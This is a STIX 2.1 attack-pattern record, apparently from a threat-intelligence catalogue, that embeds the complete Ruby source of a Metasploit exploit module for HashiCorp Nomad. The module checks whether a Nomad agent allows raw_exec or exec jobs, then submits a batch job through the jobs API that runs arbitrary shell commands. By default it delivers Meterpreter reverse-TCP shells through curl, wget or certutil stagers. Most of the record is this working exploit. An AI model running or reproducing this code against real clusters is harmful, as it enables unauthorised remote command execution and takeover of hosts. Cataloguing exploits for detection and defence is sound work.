{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--460fa5e4-a087-4418-ba07-875cb8ee3e5e",
    "created": "2024-08-14T17:06:38.020042Z",
    "modified": "2024-08-14T17:06:38.020045Z",
    "name": "HashiCorp Nomad Remote Command Execution",
    "description": " Create a batch job on HashiCorp's Nomad service to spawn a shell. The default option is to use the 'raw_exec' driver, which runs with high privileges. Development servers and client's explicitly enabling the 'raw_exec' plugin can spawn these type of jobs. Regular 'exec' jobs can be created in a similar fashion at a lower privilege level.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/misc/nomad_exec.rb",
            "external_id": "nomad_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.nomadproject.io/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'HashiCorp Nomad Remote Command Execution',\n        'Description' => %q{\n          Create a batch job on HashiCorp's Nomad service to spawn a shell. The default option\n          is to use the 'raw_exec' driver, which runs with high privileges. Development servers\n          and client's explicitly enabling the 'raw_exec' plugin can spawn these type of jobs.\n          Regular 'exec' jobs can be created in a similar fashion at a lower privilege level.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Wyatt Dahlenburg (@wdahlenb)',\n        ],\n        'References' => [\n          [ 'URL', 'https://www.nomadproject.io/' ]\n        ],\n        'Targets' => [\n          [\n            'Linux',\n            {\n              'Platform' => 'linux',\n              'CmdStagerFlavor' => ['bourne', 'echo', 'printf', 'curl', 'wget'],\n              'DefaultOptions' => { 'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp', 'WfsDelay' => 10 }\n            }\n          ],\n          [\n            'Windows',\n            {\n              'Platform' => 'win',\n              'CmdStagerFlavor' => [ 'psh_invokewebrequest', 'certutil', 'vbs' ],\n              'DefaultOptions' => { 'PAYLOAD' => 'windows/meterpreter/reverse_tcp', 'WfsDelay' => 10 }\n            }\n          ]\n        ],\n        'Payload' => {},\n        'Privileged' => false,\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2021-05-17',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS],\n          'Reliability' => [REPEATABLE_SESSION]\n        }\n      )\n    )\n    register_options(\n      [\n        OptString.new('ACL_TOKEN', [false, 'Consul Agent ACL token', '']),\n        OptString.new('DATACENTER', [true, 'The datacenter to run against', 'dc1']),\n        OptString.new('JOB_NAME', [true, 'Name of job to run (default random)', '']),\n        OptString.new('JOB_TYPE', [true, 'Driver (raw_exec or exec)', 'raw_exec']),\n        Opt::RPORT(4646),\n        OptString.new('TARGETURI', [true, 'The base path', '/']),\n        OptBool.new('SSL', [false, 'Negotiate SSL/TLS for outgoing connections', false])\n      ]\n    )\n  end\n\n  def check\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, '/v1/agent/self'),\n      'headers' => {\n        'X-Nomad-Token' => datastore['ACL_TOKEN']\n      }\n    })\n\n    unless res\n      vprint_error 'Connection failed'\n      return CheckCode::Unknown\n    end\n\n    unless res.code == 200\n      vprint_error 'Unexpected reply'\n      return CheckCode::Safe\n    end\n\n    agent_info = JSON.parse(res.body)\n\n    if agent_info['config']['Plugins']\n      agent_info['config']['Plugins'].each do |plugin|\n        if plugin['Name'] == 'raw_exec' && plugin['Config']['enabled'] == true\n          return CheckCode::Vulnerable\n        end\n      end\n    end\n\n    if agent_info['config']['Client']['Options']['driver.raw_exec.enable'] == 'true' || agent_info['config']['Client']['Options']['driver.raw_exec.enable'] == '1'\n      return CheckCode::Vulnerable\n    end\n\n    if datastore['JOB_TYPE'] == 'raw_exec' && agent_info['config']['Client']['DisableRemoteExec'] == false\n      print_status 'raw_exec doesn\\'t appear to be supported. Try setting JOB_TYPE to exec instead.'\n      return CheckCode::Appears\n    elsif datastore['JOB_TYPE'] == 'exec' && agent_info['config']['Client']['DisableRemoteExec'] == false\n      return CheckCode::Vulnerable\n    end\n\n    CheckCode::Safe\n  rescue JSON::ParserError\n    vprint_error 'Failed to parse JSON output.'\n    return CheckCode::Unknown\n  end\n\n  def execute_command(cmd, _opts = {})\n    uri = target_uri.path\n    job_name = datastore['JOB_NAME'] == '' ? Rex::Text.rand_text_alpha(5..10) : datastore['JOB_NAME']\n    print_status(\"Creating job '#{job_name}'\")\n\n    case target.name\n    when /Linux/\n      arg1 = 'sh'\n      arg2 = '-c'\n    when /Windows/\n      arg1 = 'cmd.exe'\n      arg2 = '/c'\n    end\n\n    res = send_request_cgi({\n      'method' => 'PUT',\n      'uri' => normalize_uri(uri, 'v1/jobs'),\n      'headers' => {\n        'X-Nomad-Token' => datastore['ACL_TOKEN']\n      },\n      'ctype' => 'application/json',\n      'data' => {\n        Job: {\n          ID: job_name,\n          Name: job_name,\n          Type: 'batch',\n          Datacenters: [datastore['DATACENTER']],\n          TaskGroups: [\n            {\n              Name: job_name,\n              Count: 1,\n              Tasks: [\n                {\n                  Name: job_name,\n                  Driver: datastore['JOB_TYPE'],\n                  User: '',\n                  Config: {\n                    command: arg1,\n                    args: [\n                      arg2,\n                      cmd.to_s\n                    ]\n                  },\n                  Resources: {\n                    CPU: 500,\n                    MemoryMB: 256\n                  },\n                  LogConfig: {\n                    MaxFiles: 1,\n                    MaxFileSizeMB: 1\n                  }\n                }\n              ],\n              RestartPolicy: {\n                Attempts: 0\n              },\n              EphemeralDisk: {\n                SizeMB: 300\n              }\n            }\n          ]\n        }\n      }.to_json\n    })\n    unless res && res.code == 200\n      fail_with(Failure::UnexpectedReply, 'An error occured when contacting the Nomad API.')\n    end\n\n    job_info = JSON.parse(res.body)\n    eval_id = job_info['EvalID']\n\n    print_status(\"Job '#{job_name}' successfully created as '#{eval_id}'.\")\n    print_status(\"Waiting for job '#{job_name}' to trigger\")\n  rescue JSON::ParserError\n    vprint_error 'Failed to parse JSON output.'\n  end\n\n  def exploit\n    execute_cmdstager\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-05-17",
    "x_mitre_platforms": [
        "win'"
    ]
}